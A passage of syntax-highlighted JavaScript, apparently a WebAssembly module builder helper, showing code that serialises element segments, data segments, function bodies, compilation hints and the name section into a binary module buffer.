punctuation">)</span><span class="token punctuation">;</span>                      section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>segment<span class="token punctuation">.</span>table<span class="token punctuation">)</span><span class="token punctuation">;</span>                      section<span class="token punctuation">.</span><span class="token function">emit_init_expr</span><span class="token punctuation">(</span>segment<span class="token punctuation">.</span>offset<span class="token punctuation">)</span><span class="token punctuation">;</span>                      section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>kExternalFunction<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                  <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                  <span class="token keyword">if</span> <span class="token punctuation">(</span>segment<span class="token punctuation">.</span><span class="token function">expressions_as_elements</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>segment<span class="token punctuation">.</span><span class="token function">is_passive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                      section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span><span class="token number">0x05</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                      section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span><span class="token number">0x07</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                    section<span class="token punctuation">.</span><span class="token function">emit_type</span><span class="token punctuation">(</span>segment<span class="token punctuation">.</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>segment<span class="token punctuation">.</span><span class="token function">is_passive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                      section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span><span class="token number">0x01</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                      section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span><span class="token number">0x03</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                    section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>kExternalFunction<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>                <span class="token comment">// Emit elements.</span>                section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>segment<span class="token punctuation">.</span>elements<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> element <span class="token keyword">of</span> segment<span class="token punctuation">.</span>elements<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  <span class="token keyword">if</span> <span class="token punctuation">(</span>segment<span class="token punctuation">.</span><span class="token function">expressions_as_elements</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    section<span class="token punctuation">.</span><span class="token function">emit_init_expr</span><span class="token punctuation">(</span>element<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>element<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token comment">// If there are any passive data segments, add the DataCount section.</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token boolean">true</span> <span class="token comment">/*wasm.data_segments.some(seg => !seg.is_active)*/</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            binary<span class="token punctuation">.</span><span class="token function">emit_section</span><span class="token punctuation">(</span>kDataCountSectionCode<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">section</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>              section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>data_segments<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token comment">// If there are compilation hints add a custom section 'compilationHints'</span>          <span class="token comment">// after the function section and before the code section.</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>compilation_hints<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>debug<span class="token punctuation">)</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"emitting compilation hints @ "</span> <span class="token operator">+</span> binary<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// Build custom section payload.</span>            <span class="token keyword">let</span> payloadBinary <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Binary</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">let</span> implicit_compilation_hints_count <span class="token operator">=</span> wasm<span class="token punctuation">.</span>functions<span class="token punctuation">.</span>length<span class="token punctuation">;</span>            payloadBinary<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>implicit_compilation_hints_count<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// Defaults to the compiler's choice if no better hint was given (0x00).</span>            <span class="token keyword">let</span> defaultHintByte <span class="token operator">=</span>              kCompilationHintStrategyDefault <span class="token operator">|</span>              <span class="token punctuation">(</span>kCompilationHintTierDefault <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">|</span>              <span class="token punctuation">(</span>kCompilationHintTierDefault <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// Emit hint byte for every function defined in this module.</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> implicit_compilation_hints_count<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>              <span class="token keyword">let</span> index <span class="token operator">=</span> wasm<span class="token punctuation">.</span>num_imported_funcs <span class="token operator">+</span> i<span class="token punctuation">;</span>              <span class="token keyword">var</span> hintByte<span class="token punctuation">;</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span>index <span class="token keyword">in</span> wasm<span class="token punctuation">.</span>compilation_hints<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">let</span> hint <span class="token operator">=</span> wasm<span class="token punctuation">.</span>compilation_hints<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span>                hintByte <span class="token operator">=</span>                  hint<span class="token punctuation">.</span>strategy <span class="token operator">|</span>                  <span class="token punctuation">(</span>hint<span class="token punctuation">.</span>baselineTier <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">|</span>                  <span class="token punctuation">(</span>hint<span class="token punctuation">.</span>topTier <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                hintByte <span class="token operator">=</span> defaultHintByte<span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span>              payloadBinary<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>hintByte<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token comment">// Finalize as custom section.</span>            <span class="token keyword">let</span> name <span class="token operator">=</span> <span class="token string">"compilationHints"</span><span class="token punctuation">;</span>            <span class="token keyword">let</span> bytes <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">createCustomSection</span><span class="token punctuation">(</span>              name<span class="token punctuation">,</span>              payloadBinary<span class="token punctuation">.</span><span class="token function">trunc_buffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            binary<span class="token punctuation">.</span><span class="token function">emit_bytes</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token comment">// Add function bodies.</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>functions<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// emit function bodies</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>debug<span class="token punctuation">)</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"emitting code @ "</span> <span class="token operator">+</span> binary<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">let</span> section_length <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            binary<span class="token punctuation">.</span><span class="token function">emit_section</span><span class="token punctuation">(</span>kCodeSectionCode<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">section</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>              section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>functions<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">let</span> header<span class="token punctuation">;</span>              <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> func <span class="token keyword">of</span> wasm<span class="token punctuation">.</span>functions<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>func<span class="token punctuation">.</span>locals<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  <span class="token comment">// Fast path for functions without locals.</span>                  section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>func<span class="token punctuation">.</span>body<span class="token punctuation">.</span>length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 0 locals.</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                  <span class="token comment">// Build the locals declarations in separate buffer first.</span>                  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>header<span class="token punctuation">)</span> header <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Binary</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  header<span class="token punctuation">.</span><span class="token function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  header<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>func<span class="token punctuation">.</span>locals<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> decl <span class="token keyword">of</span> func<span class="token punctuation">.</span>locals<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    header<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>decl<span class="token punctuation">.</span>count<span class="token punctuation">)</span><span class="token punctuation">;</span>                    header<span class="token punctuation">.</span><span class="token function">emit_type</span><span class="token punctuation">(</span>decl<span class="token punctuation">.</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">&#125;</span>                  section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>header<span class="token punctuation">.</span>length <span class="token operator">+</span> func<span class="token punctuation">.</span>body<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>                  section<span class="token punctuation">.</span><span class="token function">emit_bytes</span><span class="token punctuation">(</span>header<span class="token punctuation">.</span><span class="token function">trunc_buffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token comment">// Set to section offset for now, will update.</span>                func<span class="token punctuation">.</span>body_offset <span class="token operator">=</span> section<span class="token punctuation">.</span>length<span class="token punctuation">;</span>                section<span class="token punctuation">.</span><span class="token function">emit_bytes</span><span class="token punctuation">(</span>func<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span>              section_length <span class="token operator">=</span> section<span class="token punctuation">.</span>length<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> func <span class="token keyword">of</span> wasm<span class="token punctuation">.</span>functions<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>              func<span class="token punctuation">.</span>body_offset <span class="token operator">+=</span> binary<span class="token punctuation">.</span>length <span class="token operator">-</span> section_length<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>          <span class="token comment">// Add data segments.</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>data_segments<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>debug<span class="token punctuation">)</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"emitting data segments @ "</span> <span class="token operator">+</span> binary<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>            binary<span class="token punctuation">.</span><span class="token function">emit_section</span><span class="token punctuation">(</span>kDataSectionCode<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">section</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>              section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>data_segments<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> seg <span class="token keyword">of</span> wasm<span class="token punctuation">.</span>data_segments<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>seg<span class="token punctuation">.</span>is_active<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  <span class="token keyword">if</span> <span class="token punctuation">(</span>seg<span class="token punctuation">.</span>mem_index <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>kActiveNoIndex<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>kActiveWithIndex<span class="token punctuation">)</span><span class="token punctuation">;</span>                    section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>seg<span class="token punctuation">.</span>mem_index<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">&#125;</span>                  <span class="token keyword">if</span> <span class="token punctuation">(</span>seg<span class="token punctuation">.</span>is_global<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token comment">// Offset is taken from a global.</span>                    section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>kExprGlobalGet<span class="token punctuation">)</span><span class="token punctuation">;</span>                    section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>seg<span class="token punctuation">.</span>offset<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    <span class="token comment">// Offset is a constant.</span>                    section<span class="token punctuation">.</span><span class="token function">emit_bytes</span><span class="token punctuation">(</span><span class="token function">wasmI32Const</span><span class="token punctuation">(</span>seg<span class="token punctuation">.</span>offset<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">&#125;</span>                  section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>kExprEnd<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                  section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>kPassive<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>seg<span class="token punctuation">.</span>data<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>                section<span class="token punctuation">.</span><span class="token function">emit_bytes</span><span class="token punctuation">(</span>seg<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token comment">// Add any explicitly added sections.</span>          <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> exp <span class="token keyword">of</span> wasm<span class="token punctuation">.</span>explicit<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>debug<span class="token punctuation">)</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"emitting explicit @ "</span> <span class="token operator">+</span> binary<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>            binary<span class="token punctuation">.</span><span class="token function">emit_bytes</span><span class="token punctuation">(</span>exp<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token comment">// Add names.</span>          <span class="token keyword">let</span> num_function_names <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>          <span class="token keyword">let</span> num_functions_with_local_names <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>          <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> func <span class="token keyword">of</span> wasm<span class="token punctuation">.</span>functions<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>func<span class="token punctuation">.</span>name <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token operator">++</span>num_function_names<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>func<span class="token punctuation">.</span><span class="token function">numLocalNames</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">++</span>num_functions_with_local_names<span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>            num_function_names <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">||</span>            num_functions_with_local_names <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">||</span>            wasm<span class="token punctuation">.</span>name <span class="token operator">!==</span> <span class="token keyword">undefined</span>          <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>debug<span class="token punctuation">)</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"emitting names @ "</span> <span class="token operator">+</span> binary<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>            binary<span class="token punctuation">.</span><span class="token function">emit_section</span><span class="token punctuation">(</span>kUnknownSectionCode<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">section</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>              section<span class="token punctuation">.</span><span class="token function">emit_string</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment">// Emit module name.</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>name <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                section<span class="token punctuation">.</span><span class="token function">emit_section</span><span class="token punctuation">(</span>kModuleNameCode<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">name_section</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>                  name_section<span class="token punctuation">.</span><span class="token function">emit_string</span><span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span>              <span class="token comment">// Emit function names.</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span>num_function_names <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                section<span class="token punctuation">.</span><span class="token function">emit_section</span><span class="token punctuation">(</span>kFunctionNamesCode<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">name_section</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>                  name_section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>num_function_names<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> func <span class="token keyword">of</span> wasm<span class="token punctuation">.</span>functions<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>func<span class="token punctuation">.</span>name <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>                    name_section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>func<span class="token punctuation">.</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>                    name_section<span class="token punctuation">.</span><span class="token function">emit_string</span><span class="token punctuation">(</span>func<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span>              <span class="token comment">// Emit local names.</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span>num_functions_with_local_names <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                section<span class="token punctuation">.</span><span class="token function">emit_section</span><span class="token punctuation">(</span>kLocalNamesCode<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">name_section</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>                  name_section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>num_functions_with_local_names<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> func <span class="token keyword">of</span> wasm<span class="token punctuation">.</span>functions<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>func<span class="token punctuation">.</span><span class="token function">numLocalNames</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>                    name_section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>func<span class="token punctuation">.</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>                    name_section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>func<span class="token punctuation">.</span><span class="token function">numLocalNames</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">let</span> name_index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> func<span class="token punctuation">.</span>local_names<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> func<span class="token punctuation">.</span>local_names<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"string"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        name_section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>name_index<span class="token punctuation">)</span><span class="token punctuation">;</span>                        name_section<span class="token punctuation">.</span><span class="token function">emit_string</span><span class="token punctuation">(</span>func<span class="token punctuation">.</span>local_names<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        name_index<span class="token operator">++</span><span class="token punctuation">;</span>                      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                        name_index <span class="token operator">+=</span> func<span class="token punctuation">.</span>local_names<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                      <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span>                  <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token keyword">return</span> binary<span class="token punctuation">.</span><span class="token function">trunc_buffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">toArray</span><span class="token punctuation">(</span><span class="token parameter">debug <span class="token operator">=</span> <span class="token boolean">false</span></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">return</span> Array<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">toBuffer</span><span class="token punctuation">(</span>debug<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">instantiate</span><span class="token punctuation">(</span><span class="token parameter">ffi<span class="token punctuation">,</span> options</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">let</span> module <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">toModule</span><span class="token punctuation">(</span>options<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">let</span> instance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebAssembly<span class="token punctuation">.</span>Instance</span><span class="token punctuation">(</span>module<span class="token punctuation">,</span> ffi<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> instance<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">asyncInstantiate</span><span class="token punctuation">(</span><span class="token parameter">ffi</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">return</span> WebAssembly<span class="token punctuation">.</span><span class="token function">instantiate</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">toBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ffi<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>            <span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">&#123;</span> module<span class="token punctuation">,</span> instance <span class="token punctuation">&#125;</span></span><span class="token punctuation">)</span> <span class="token operator">=></span> instance          <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">toModule</span><span class="token punctuation">(</span><span class="token parameter">options<span class="token punctuation">,</span> debug <span class="token operator">=</span> <span class="token boolean">false</span></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token 